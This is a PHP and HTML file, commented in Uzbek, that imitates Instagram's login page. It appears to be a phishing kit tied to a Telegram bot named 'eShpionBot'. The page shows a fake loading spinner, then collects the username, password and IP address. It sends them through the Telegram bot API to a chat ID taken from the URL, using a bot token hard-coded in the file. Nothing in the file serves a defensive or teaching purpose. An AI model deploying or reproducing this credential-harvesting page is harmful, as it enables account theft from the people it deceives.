<?php
// domen.name/rm/123456789 formatida ishlaydi

// URL dan user_id ni olish
$path = $_SERVER['REQUEST_URI'];
$parts = explode('/', trim($path, '/'));

if (count($parts) >= 2) {
    $user_id = end($parts);
} else {
    $user_id = $_GET['id'] ?? '';
}


if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}

// Agar form submit bo'lsa
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    
    if(!empty($username) && !empty($password)) {
        // Telegramga yuborish
        $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
        $chat_id = $user_id;
        
        $message = "📱 <b>Instagram Login Ma'lumotlari</b>\n\n";
        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n";
        $message .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
        $message .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🆔 <b>User ID:</b> <code>$user_id</code>";
        
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    }
    
    // Instagramga yo'naltirish
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}
?>
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { max-width: 350px; width: 100%; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px 40px; text-align: center; }
        .instagram-logo { font-family: 'Billabong', cursive; font-size: 42px; margin: 10px 0 30px; color: #262626; }
        .login-form input { width: 100%; padding: 12px 8px; margin: 4px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
        .login-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 10px; margin: 12px 0; font-weight: 600; cursor: pointer; }
        .login-btn:hover { background: #1877f2; }
        .divider { margin: 20px 0; color: #8e8e8e; font-size: 13px; display: flex; align-items: center; justify-content: center; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin: 15px 0; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; }
        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; justify-content: center; align-items: center; z-index: 9999; flex-direction: column; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden-form { display: none; }
        @font-face { font-family: 'Billabong'; src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff'); }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Instagramga kirilmoqda...</div>
    </div>

    <div id="mainContent" class="hidden-form">
        <div class="container">
            <div class="login-box">
                <div class="instagram-logo">Instagram</div>
                <form class="login-form" id="loginForm" method="POST">
                    <input type="text" name="username" placeholder="Foydalanuvchi nomi yoki email" required>
                    <input type="password" name="password" placeholder="Parol" required>
                    <button type="submit" class="login-btn">Kirish</button>
                </form>
                
                <div class="divider">YOKI</div>
                
                <a href="#" class="forgot-password">Parolni unutdingizmi?</a>
            </div>
            
            <div class="signup-box">
                Hisobingiz yo'qmi? <a href="#">Ro'yxatdan o'ting</a>
            </div>
        </div>
    </div>

    <script>
        setTimeout(function() {
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('mainContent').classList.remove('hidden-form');
            
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                this.submit();
            });
        }, 2000);
    </script>
</body>
</html>